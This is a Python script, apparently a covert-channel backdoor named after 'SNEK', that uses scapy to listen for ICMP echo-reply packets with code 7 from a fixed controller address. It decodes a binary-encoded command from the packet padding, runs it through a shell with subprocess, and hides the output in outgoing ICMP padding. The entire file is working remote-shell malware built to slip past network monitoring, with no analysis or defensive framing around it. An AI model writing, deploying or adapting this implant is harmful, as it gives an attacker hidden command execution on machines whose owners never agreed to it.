import sys, subprocess, random, time
import SNEKactions
from scapy.all import *
from os import system

# 1472 Bytes is max payload size before fragmentation occurs


global msgCnt, sourceIP, destination

sourceIP = sys.argv[1]
destination = sys.argv[2]


def tx(command,length):
    time.sleep(2)
    print("About to send:  ", command)
    target = IP(dst=destination, src=sourceIP, id=(random.randint(1,256)))/ICMP(type=0, code=7)/Padding(command)
    send(target)


def rx():
    
    
    def strip_packet(packet):
        id = packet[ICMP].id
        code = packet[ICMP].code

        if packet[IP].src != '192.168.0.1':
            rx()
        elif packet[ICMP].type in [0, 'echo-reply']:
            if code == 7:
                messageByteLike = packet[Padding].load
                message = messageByteLike.decode()
                strippedMessage = message.rstrip("\x00")
                length = len(strippedMessage)
                while length % 8 != 0:
                    strippedMessage = "0"+str(strippedMessage)
                    length = len(str(strippedMessage))
                command = bin_decode(strippedMessage)
                if command == '!HISS!':
                    exit()
                output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
                cleanOutput = (output.stdout).decode()
                print("Cleaned output:  ", cleanOutput)
                tx(bin_encode(cleanOutput), 1)
                

    msgCnt = 0
    sniff(filter = 'icmp', prn=strip_packet,count=1)


def bin_encode(command):
    values = []
    binary = []
    for char in command:
        values.append(ord(char))
    for value in values:
        bits = str(bin(value)[2:])
        length = len(bits)
        while length < 8:
            bits = "0"+bits
            length = len(bits)
        binary.append(bits)
    value = join_bin(binary)
    return str(value)


def bin_decode(output):
    length = len(output)
    numBytes = length/8
    counter = 0
    byteList = []
    charList = []
    start = 0
    end = 8

    while counter < length:
        byteSection = output[start:end]
        byteList.append(byteSection)
        start = start + 8
        end = end + 8
        counter += 1
    
    
    for value in byteList:
        if value != '':
            baseTwoVal = int(value, 2)
            char = chr(baseTwoVal)
            charList.append(char)
    
    message = "".join(charList)
    return message





def join_bin(list):
    if len(list) != 0:
        string = [str(i) for i in list]
        returnVal = int("".join(string))
    else:
        returnVal = 0
     
    return(returnVal)

        
   


while True:
    rx()